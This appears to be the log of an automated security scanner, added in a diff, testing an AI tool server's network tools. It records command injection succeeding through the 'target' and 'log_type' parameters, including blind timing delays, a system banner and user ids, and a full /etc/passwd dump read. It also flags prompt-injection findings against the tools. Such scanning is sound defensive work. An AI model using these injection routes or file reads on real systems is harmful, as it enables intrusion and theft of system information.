+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006551265716552734}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005848884582519531}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Network diagnostic results:\\n\\n/bin/sh: 1: ./network_diagnostic.sh: Permission denied\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005651712417602539}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Network diagnostic results:\\n\\n/bin/sh: 1: ./network_diagnostic.sh: Permission denied\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005608320236206055}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006287813186645508}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004334211349487305}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005191326141357422}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004881381988525391}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'uid=\\d+\\([^)]+\\)', 'match': 'uid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'gid=\\d+\\([^)]+\\)', 'match': 'gid=1001(targetuser)'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'groups=\\d+', 'match': 'groups=1001'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006106853485107422}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005905628204345703}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'Linux.*\\d+\\.\\d+\\.\\d+', 'match': 'Linux 971842f6bacf 6.18.54.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Tue Oct  6 19:13:07 UTC 2026 x86_64 GNU/Linux\\n"}],"structuredContent":{"result":"Network diagnostic results:\\n\\n/bin/sh: 1: ./network_diagnostic.sh: Permission denied\\nLinux 971842f6bacf 6.18.54.1'}
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'GNU/Linux', 'match': 'GNU/Linux'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005681514739990234}
+[WARNING] network_diagnostic: BLIND_RCE_TIMING via target
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.008475303649902}
+[WARNING] network_diagnostic: BLIND_RCE_TIMING via target
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.006972789764404}
+[WARNING] network_diagnostic: BLIND_RCE_TIMING via target
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.005249738693237}
+[WARNING] network_diagnostic: BLIND_RCE_TIMING via target
+[WARNING]   Detection: Timing delay: 10.01s
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 10.007577896118164}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006626605987548828}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0045125484466552734}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\n"}],"structuredContent":{"result":"Network diagnostic results:\\n\\n/bin/sh: 1: ./network_diagnostic.sh: Permission denied\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.00578761100769043}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'RCE', 'indicator': 'root:.*:0:0', 'match': 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\ntcpdump:x:100:101::/nonexistent:/usr/sbin/nologin\\ntargetuser:x:1001:1001::/home/targetuser:/bin/bash\\n"}],"structuredContent":{"result":"Network diagnostic results:\\n\\n/bin/sh: 1: ./network_diagnostic.sh: Permission denied\\nroot:x:0:0'}
+[WARNING]   Detection: {'type': 'FILE_READ', 'indicator': 'root:x:', 'match': 'root:x:'}
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006042957305908203}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.005876302719116211}
+[WARNING] network_diagnostic: command_injection via target
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.006754636764526367}
+[WARNING] view_network_logs: command_injection via log_type
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.0062122344970703125}
+[WARNING] view_network_logs: command_injection via log_type
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.003731966018676758}
+[WARNING] view_network_logs: command_injection via log_type
+[WARNING]   Detection: {'type': 'TIMING', 'elapsed': 0.004024982452392578}
+[INFO] Testing path traversal...
+[INFO] Testing side channels...
+[INFO] Skipping subscription flood (safe mode)
+[INFO] Testing prompt injection...
+[WARNING] ping_host: MARKDOWN_IMAGE_INJECTION
+[WARNING] ping_host: DELIMITER_BREAKOUT
+[WARNING] ping_host: POSSIBLE_CONTEXT_CONFUSION
+[WARNING] port_scan: MARKDOWN_IMAGE_INJECTION
+[WARNING] port_scan: MARKDOWN_IMAGE_INJECTION
+[WARNING] port_scan: DELIMITER_BREAKOUT
+[WARNING] port_scan: DELIMITER_BREAKOUT
+[WARNING] port_scan: POSSIBLE_CONTEXT_CONFUSION
+[WARNING] port_scan: POSSIBLE_CONTEXT_CONFUSION
+[WARNING] network_diagnostic: MARKDOWN_IMAGE_INJECTION
+[WARNING] network_diagnostic: DELIMITER_BREAKOUT
+[WARNING] network_diagnostic: POSSIBLE_CONTEXT_CONFUSION
+[WARNING] view_network_logs: MARKDOWN_IMAGE_INJECTION
+[WARNING] view_network_logs: DELIMITER_BREAKOUT
+[WARNING] view_network_logs: POSSIBLE_CONTEXT_CONFUSION
+[INFO] Skipping protocol fuzzing (safe mode)
+[INFO] Testing OOB DNS exfiltration...
